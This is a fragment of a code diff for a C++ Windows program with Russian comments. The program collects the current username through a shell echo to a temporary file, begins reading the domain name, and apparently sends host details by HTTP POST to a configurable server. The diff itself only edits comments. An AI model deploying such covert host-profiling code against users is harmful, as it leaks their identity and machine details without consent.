@@ -53,20 +53,20 @@ void sendHttpPost(const std::string& server, const std::string& port, const std:
 }
 
 
-std::string server = "127.0.0.1"; // Замените на адрес вашего сервера
-std::string port = "54653"; // Замените на нужный порт
-std::string nameUser = "John Doe"; // Имя для отправки
-std::string domainUser = "000"; // Имя для отправки
-std::string machineUser = "Old"; // Имя для отправки
-std::string ipUser = "192.168.1.1"; // IP-адрес 
+std::string server = "127.0.0.1"; // замените на адрес вашего сервера
+std::string port = "54653"; // замените на нужный порт
+std::string nameUser = "John Doe"; 
+std::string domainUser = "000"; 
+std::string machineUser = "Old";
+std::string ipUser = "192.168.1.1"; 
 
 void data() {
-    system("echo %username% > cache.txt"); // Записываем в файл вывод echo
+    system("echo %username% > cache.txt"); 
     std::ifstream cacheFile("cache.txt");
-    std::string userName; // Здесь будет имя пользователя
+    std::string userName; // 
     getline(cacheFile, userName);
     nameUser = userName;
-    system("del cache.txt"); // Не мусорим!
+    system("del cache.txt"); 
 
     char domainName[255];
     DWORD domainName_len = sizeof(domainName);
